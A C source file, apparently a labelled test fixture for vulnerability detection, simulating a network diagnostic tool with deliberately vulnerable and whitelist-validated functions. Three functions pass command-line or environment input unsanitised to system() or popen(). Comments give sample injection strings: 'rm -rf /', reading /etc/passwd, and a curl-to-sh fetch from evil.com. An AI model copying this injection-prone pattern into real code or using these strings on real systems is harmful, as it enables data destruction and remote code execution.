/**
 * realworld_cmd_injection.c
 *
 * Simulates a simple network diagnostic CLI tool ("netdiag")
 * that accepts a hostname or IP via command-line arguments and
 * environment variables, then runs various network commands.
 *
 * VULN patterns: system()/popen() with user-controlled input concatenation
 * SAFE patterns: whitelist validation before use
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>

/* Maximum allowed hostname length */
#define MAX_HOSTNAME_LEN 253
#define MAX_CMD_LEN 1024

/**
 * Validate that a hostname contains only safe characters.
 * Returns 1 if safe, 0 if dangerous characters detected.
 */
static int is_safe_hostname(const char *input) {
    if (!input || strlen(input) == 0 || strlen(input) > MAX_HOSTNAME_LEN) {
        return 0;
    }
    /* Allow only alphanumeric, hyphens, dots */
    for (size_t i = 0; i < strlen(input); i++) {
        char c = input[i];
        if (!(isalnum((unsigned char)c) || c == '-' || c == '.')) {
            return 0;
        }
    }
    return 1;
}

/**
 * Perform a DNS lookup on a hostname.
 * SAFE: validates input against whitelist before passing to system()
 */
void safe_dns_lookup(const char *hostname) {
    if (!is_safe_hostname(hostname)) {
        fprintf(stderr, "Error: invalid hostname '%s'\n", hostname);
        return;
    }
    char cmd[MAX_CMD_LEN];
    snprintf(cmd, sizeof(cmd), "nslookup %s", hostname);
    printf("Running: %s\n", cmd);
    system(cmd);
}

/**
 * Perform a traceroute to a target.
 * SAFE: validates input against whitelist before passing to popen()
 */
void safe_traceroute(const char *target) {
    if (!is_safe_hostname(target)) {
        fprintf(stderr, "Error: invalid target '%s'\n", target);
        return;
    }
    char cmd[MAX_CMD_LEN];
    snprintf(cmd, sizeof(cmd), "traceroute %s 2>&1", target);
    printf("Running: %s\n", cmd);
    FILE *fp = popen(cmd, "r");
    if (fp) {
        char buf[256];
        while (fgets(buf, sizeof(buf), fp)) {
            printf("  %s", buf);
        }
        pclose(fp);
    }
}

/**
 * Run a ping sweep on a network range.
 * VULN: system() with argv directly concatenated — no sanitization.
 *       An attacker can pass "127.0.0.1; rm -rf /" as argv[1].
 */
void vuln_ping_sweep(const char *target) {
    char cmd[MAX_CMD_LEN];
    /* VULN: Command injection via system() with unsanitized user input */
    snprintf(cmd, sizeof(cmd), "ping -c 4 %s", target);
    printf("Running: %s\n", cmd);
    system(cmd);
}

/**
 * Run a whois lookup from an environment variable.
 * VULN: popen() with getenv() value directly concatenated — no sanitization.
 *       If WHOIS_HOST env var contains "; cat /etc/passwd", it gets executed.
 */
void vuln_whois_lookup(void) {
    const char *host = getenv("WHOIS_HOST");
    if (!host) {
        fprintf(stderr, "WHOIS_HOST not set\n");
        return;
    }
    char cmd[MAX_CMD_LEN];
    /* VULN: Command injection via popen() with unsanitized getenv() input */
    snprintf(cmd, sizeof(cmd), "whois %s 2>&1", host);
    printf("Running: %s\n", cmd);
    FILE *fp = popen(cmd, "r");
    if (fp) {
        char buf[256];
        while (fgets(buf, sizeof(buf), fp)) {
            printf("  %s", buf);
        }
        pclose(fp);
    }
}

/**
 * Run a port scan using nmap.
 * VULN: system() with argv directly concatenated — no sanitization.
 *       An attacker can pass "127.0.0.1 && curl evil.com/shell.sh | sh"
 */
void vuln_port_scan(const char *target) {
    char cmd[MAX_CMD_LEN];
    /* VULN: Command injection via system() with unsanitized user input */
    snprintf(cmd, sizeof(cmd), "nmap -sT %s", target);
    printf("Running: %s\n", cmd);
    system(cmd);
}

int main(int argc, char *argv[]) {
    if (argc < 2) {
        printf("Usage: %s <target_host_or_ip>\n", argv[0]);
        printf("Environment: WHOIS_HOST=<host> for whois lookup\n");
        return 1;
    }

    printf("=== Netdiag Network Diagnostic Tool ===\n\n");

    /* VULN: Ping sweep with unsanitized command-line argument */
    vuln_ping_sweep(argv[1]);

    printf("\n");

    /* VULN: Port scan with unsanitized command-line argument */
    vuln_port_scan(argv[1]);

    printf("\n");

    /* VULN: Whois lookup with unsanitized environment variable */
    vuln_whois_lookup();

    printf("\n");

    /* SAFE: DNS lookup with whitelist-validated input */
    safe_dns_lookup(argv[1]);

    printf("\n");

    /* SAFE: Traceroute with whitelist-validated input */
    safe_traceroute(argv[1]);

    return 0;
}
